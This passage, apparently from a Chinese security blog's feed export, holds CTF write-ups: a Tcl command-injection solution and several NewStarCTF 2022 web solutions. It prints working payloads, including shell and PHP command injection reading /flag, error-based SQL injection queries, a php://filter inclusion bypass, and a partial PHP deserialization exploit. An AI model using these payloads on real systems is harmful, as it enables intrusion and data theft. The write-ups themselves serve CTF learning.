Utilities&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Environment :: Console&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Intended Audience :: Other Audience&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    install_requires=[<span class="string">&#x27;itsdangerous&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>],</span><br><span class="line">    <span class="comment"># https://python-packaging.readthedocs.io/en/latest/command-line-scripts.html</span></span><br><span class="line">    scripts=[<span class="string">&#x27;flask_session_cookie_manager2.py&#x27;</span>, <span class="string">&#x27;flask_session_cookie_manager3.py&#x27;</span>],</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Mark处是更改的地方，由于安装依赖的顶层包有两个版本2和3，因此setup在读取时不知道读取哪个，就会产生报错：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">error: Multiple top<span class="literal">-level</span> packages discovered <span class="keyword">in</span> a flat<span class="literal">-layout</span>:...</span><br></pre></td></tr></table></figure></div>

<p>该脚本的安装需要同时用到两个依赖，因此需要手动指定用到的包，即Mark2处的内容。</p>
<h3 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h3>]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>TCL命令注入_西湖论剑2024-ezinject</title>
    <url>/2024/03/11/Security/CTF/TCL%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024-ezinject/</url>
    <content><![CDATA[<h3 id="exec-与-system"><a href="#exec-与-system" class="headerlink" title="exec 与 system"></a>exec 与 system</h3><p>Tcl 执行 linux 命令可用的函数有 <code>exec</code> 和 <code>system</code></p>
<p>exec 要求传入参数独立且用分隔符严格分开，每个参数只能是可执行文件名、子参数或重定向符中的一个，不接受连在一起的多个参数符号，因此：</p>
<p>[exec echo test -d ‘<code>mktemp</code>‘|bash]</p>
<p>上述语句将执行失败，因为 exec 会把 <code>&#39;</code>mktemp<code>|bash&#39;</code> 一整个当成字符串参数处理，管道符与bash将失去原有含义。同时 exec 不支持一般 shell 的字符扩展处理，例如内联、转义和引号，引号将会被原样传入，因此真正想用 exec 执行上述语句需要写成：</p>
<p>[exec echo test -d <code>mktemp</code>|bash]</p>
<p>tclx 支持扩展的 unix 交互接口，用 <code>[system cmd...]</code> 将会使用系统默认 shell 解释执行后续传入的内容，完全遵循这些 shell 的特点与规则。</p>
<p>简单来说，exec 为要执行的目标命令（通常为可执行文件）创建专用子进程并执行，通过一定语法规则解析后续参数，包括将字符串参数传给目标命令，执行可执行文件，管道重定向操作等。而 system 将后面的所有命令内容直接丢给系统默认 shell 自行解析处理。</p>
<p>参考：<a class="link"   href="https://wiki.tcl-lang.org/" >Tcl-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<p>system 命令来自 tcl 的扩展库 tclx，tcl 本身是不自带 tclx 的内容的，但 expect （较新的版本）封装了该扩展库。</p>
<h3 id="西湖论剑-web-ezinject"><a href="#西湖论剑-web-ezinject" class="headerlink" title="西湖论剑-web-ezinject"></a>西湖论剑-web-ezinject</h3><p>只讲 tcl 注入部分，java 将如下代码交给 shell 执行：</p>
<p><code>&quot;/app/ezjava/runexpect.sh /app/ezjava/expect/ expect /app/ezjava/call.sh 1 &quot;+command</code></p>
<p>“<a class="link"   href="http://runexpect.sh/" >runexpect.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">\#!/bin/sh</span><br><span class="line"></span><br><span class="line">\# Set LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=$1</span><br><span class="line"></span><br><span class="line">echo &quot;Assuming LD_LIBRARY_PATH in runexpect :&quot; $LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">shift</span><br><span class="line"></span><br><span class="line">echo &quot;Running command: $*&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">*</span></span><br><span class="line"></span><br><span class="line">exit $?</span><br></pre></td></tr></table></figure></div>

<p>“<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">\#!/usr/bin/tclsh</span><br><span class="line"></span><br><span class="line">set password [lindex $argv 0]</span><br><span class="line"></span><br><span class="line">set host [lindex $argv 1]</span><br><span class="line"></span><br><span class="line">set port [lindex $argv 2]</span><br><span class="line"></span><br><span class="line">set dir [lindex $argv 3]</span><br><span class="line"></span><br><span class="line">puts $argv</span><br><span class="line"></span><br><span class="line">eval spawn ssh -p $port $host test -d $dir &amp;&amp; echo exists</span><br><span class="line"></span><br><span class="line">expect &quot;*(yes/no*)?*$&quot; &#123; send &quot;yes\n&quot; &#125;</span><br><span class="line"></span><br><span class="line">set timeout 600</span><br><span class="line"></span><br><span class="line">expect &quot;*assword:*$&quot; &#123; send &quot;$password\n&quot; &#125; \</span><br><span class="line"></span><br><span class="line">timeout &#123; exit 1 &#125;</span><br><span class="line"></span><br><span class="line">set timeout -1</span><br><span class="line"></span><br><span class="line">expect &quot;\\$ $&quot;</span><br></pre></td></tr></table></figure></div>

<p>command 是被传入的可控字符串参数，对应 <code>call.sh</code> 中的 <code>$host, $port, $dir</code> 参数。目的是注入恶意指令到以下语句：</p>
<p><code>eval spawn ssh -p $port $host test -d $dir &amp;&amp; echo exists</code></p>
<p>如果直接调用 “<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>” 进行注入，则任意选一个参数，写一个内联语句就行，例如给 <code>$host</code> 传一个：<code>[exec cat /flag &gt; /dev/...]</code></p>
<p>但是原题利用另一个脚本 “<a class="link"   href="http://runexpect.sh/" >runexpect.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>” 间接调用 “<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”，导致无法传入有效的空格，因此需要转换思路，参考上面 <code>system</code> 的用法，利用三个参数构造如下语句：</p>
<p><code>[system echo test -d &#39;`cat&lt;/flag&gt;/dev/...`&#39;|bash]</code></p>
<p><code>echo</code> 命令会输出 <code>test -d `cat&lt;/flag&gt;/dev/...` </code> 交给 bash 解析，反引号会自动执行其中的内容，达成恶意命令注入的效果。反引号中也可以用制表符 <code>\t</code> 代替空格：</p>
<p><code>[system echo test -d &#39;`cat\t&lt;\t/flag&gt;/dev/...`&#39;|bash]</code></p>
<hr>
<p>感兴趣的可以试试，欢迎讨论其他做法</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>NewStarCTF 2022</title>
    <url>/2022/10/18/Security/CTF/NewStarCTF%202022/</url>
    <content><![CDATA[<h2 id="WEB-Week1"><a href="#WEB-Week1" class="headerlink" title="WEB-Week1"></a>WEB-Week1</h2><h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h3><p>提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag has three part, qsdz hid them in different files.</span><br><span class="line">By the way, these files are sensitive.</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--I used VIM to write this file, but some errors occurred midway.--&gt;</span><br></pre></td></tr></table></figure></div>

<p>三段flag藏在三个敏感文件中，有一个是VIM意外退出生成的 <code>.?.swp</code> 文件，由于是网页文件，猜测文件为：”.index.php.swp”。得到第二段flag为”0_e4sy_d0_y00”</p>
<p>备份敏感文件robots.txt中藏有第一段flag”flag{Th1s_Is_s00”，网页的常用文件<a href="http://www.zip中藏有第三段flag："u_th1nk_so?}">www.zip中藏有第三段flag：&quot;u_th1nk_so?}</a>“</p>
<p>本来想扫描的，看了<a class="link"   href="https://blog.csdn.net/weixin_46497491/article/details/126960995" >wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>就直接得到文件了</p>
<h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h3><p>一道php绕过，源码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先需要GET方式传入data，通过file_get_contents(data)函数访问一个文件内容且该内容恰好为”Weilcome to CTF”。借助data伪协议可以将文件流替换为输入流，构造 <code>/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=</code> 其中”V2VsY29tZSB0byBDVEY&#x3D;”是”Welcome to CTF”的base64编码</p>
<p>接着需要构造key1和key2以满足两者的md5编码结果能通过”===“测试且key1和key2的值能通过”!==“测试，要求两者内容不同但md5相同实际上是要求一个md5碰撞，但还有更简单的方法，由于php的 <code>md5()</code> 函数无法处理数组，一律返回null，因此只需要传入数组即可通过”===“测试：<code>key1[]=1&amp;key2[]=2</code></p>
<p>接着来到第三层检测，<code>is_numberic()</code> 函数检测变量是否为数字或数字字符串，浮点型也可返回true；<code>intval()</code> 获取变量的整数值；因此需要用post方式传入num变量使得它不是一个数字的同时将其转化为数字又等于2077。payload：<code>num=2077a</code> 。转化为数字时取开头连续的数字为2077，判断类型时由于a的存在被判断为非数字字符串。（好像有点简单233）十六进制 <code>num=0x81D</code> 无法绕过是因为字符串”0x81D”被认为是数字字符串</p>
<p>然后可以传入cmd参数进行命令执行，但是前面连接了一个注释符，因此需要绕过，可以使用换行符 <code>%0a</code> 换行绕过：<code>cmd=%0asystem(&#39;cat /flag&#39;);</code> 即可得到flag。或者使用 <code>?&gt;</code> 的闭合也可以绕过：<code>cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> (<code>eval()</code> 函数中”?&gt;”的神奇效果，好像是直接将其插入到php文件中一样)</p>
<p>因此最终的payload：<code>http://de68bddc-7ec1-4ca7-b9d8-0eb85578a5e4.node4.buuoj.cn:81/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1[]=1&amp;key2[]=2&amp;cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> +POST内容：<code>num=2077a</code></p>
<p>参考：[</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53142368/article/details/116594299" >PHP伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/djkl/p/16778392.html" >DjkL-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
<h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>一道简单的SQL注入，就是有点迷惑性，先试试是不是数字型：<code>1 or 1=1</code> ，回显无任何内容，且1 or 1&#x3D;1被原样作为用户名打了出来，看上去很奇怪。再尝试字符型： <code>1&#39;</code> 发现没有报错，且 <code>1&#39;</code> 也被原样打了出来，我起初以为它做了严格的防sql的防火墙，后来发现它只是把输出原样打到了屏幕上。</p>
<p>payload：<code>1&#39; or &#39;1</code> 即可将数据库中所有留言都显示出来，其中就有flag。实际上注入是有效的，但是由于回显只是简单的将搜索结果和输入内容输出，若注入语句查询不到任何东西则回显内容也是空的，有一定欺骗性，因此看起来像是无法注入。</p>
<h2 id="WEB-Week2"><a href="#WEB-Week2" class="headerlink" title="WEB-Week2"></a>WEB-Week2</h2><h3 id="Word-For-You-1"><a href="#Word-For-You-1" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>由于调试信息回显了出来，因此是一道报错注入，本题查询成功时不再回显查询结果</p>
<p>先注入库名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>再注入表名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>wfy<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy_admin,wfy_comments,wfy_info<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>猜测在’wfy_comments’中，注入列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>wfy_comments<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>id,text,<span class="keyword">user</span>,name,display<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>评论应该在text中，注入text列：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select text from wfy_comments limit 11,1),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>flag&#123;Ju4t_m2ke_some_err0rs&#125;<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>由于评论不止一条，使用”limit 11,1”获取第十一条就是flag。也可以使用”group_concat()”函数将所有评论连接起来，但是由于报错回显的长度有限，并不能将所有内容输出，这时候还可以用”MID()”函数提取字符串部分的方式寻找并取得flag。</p>
<h3 id="Include-One"><a href="#Include-One" class="headerlink" title="Include One"></a>Include One</h3><p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>随机数种子的破解工具：<a class="link"   href="https://www.openwall.com/php_mt_seed/" >php mt_srand()碰撞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>先破解随机数，post传入 <code>guess=1202031004</code> ，下方的正则过滤了”base”与”..&#x2F;“，并要求必须出现”NewStar”，提示flag在”flag.php”中，由于flag存储在php文件中，直接读取可能会化为源码隐藏起来，因此读取时需要字符转化来绕过 <code>&lt;?php</code> ，使用php的filter协议中的 <code>string.rot13</code> 来绕过即可，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/NewStar/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure></div>

<p> 这里用不上目录穿越，flag.php就在工作目录下，也不在”NewStar”中。最终读取到的flag形式：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--?cuc //synt&#123;8o8q8p5n-1441-4890-o2r7-s02s9n44586s&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">-&gt; flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span><br></pre></td></tr></table></figure></div>

<p>不知道flag.php如何编写才能有这种效果，若flag.php内容如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line"></span><br><span class="line">-&gt;Parse error: syntax error, unexpected end of file in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>会出现报错，改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125; ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>访问flag.php：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=string.rot13/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">-&gt; Warning: Use of undefined constant cuc - assumed <span class="string">&#x27;cuc&#x27;</span> (this will <span class="keyword">throw</span> an <span class="built_in">Error</span> in a future version of PHP) in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>最终无法以html注释的形式获得flag。改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?php <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>则不需要rot13也能直接读取到flag。不知道怎么出题！</p>
<p>参考：[</p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/266565.html" >php伪协议绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p><a class="link"   href="https://www.php.net/manual/zh/filters.php" >php过滤器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p>]</p>
<h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><p>源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注释掉 <code>error_reporting(0);</code> 可查看报错</p>
<p>反序列化链：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Start</span>::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">-&gt;<span class="title class_">Easy</span>::<span class="title function_ invoke__">__call</span>()</span><br><span class="line">-&gt;eeee::<span class="title function_ invoke__">__clone</span>()</span><br><span class="line">-&gt;<span class="title class_">Start</span>::<span class="title function_ invoke__">__isset</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__invoke</span>()</span><br><span class="line">-&gt;<span class="title function_ invoke__">getFlag</span>()</span><br></pre></td></tr></table></figure></div>

<p>exp：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg1</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;obj=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg2</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;	<span class="comment">// 全部改成public</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;func=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sta1</span>=<span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$sec1</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>;	</span><br><span class="line"><span class="variable">$eas1</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$eee1</span>=<span class="keyword">new</span> eeee;</span><br><span class="line"><span class="comment"># $sta2=new Start;	// 若有多个Start，将多次调用析构函数出现问题</span></span><br><span class="line"><span class="comment"># $sec2=new Sec;	// 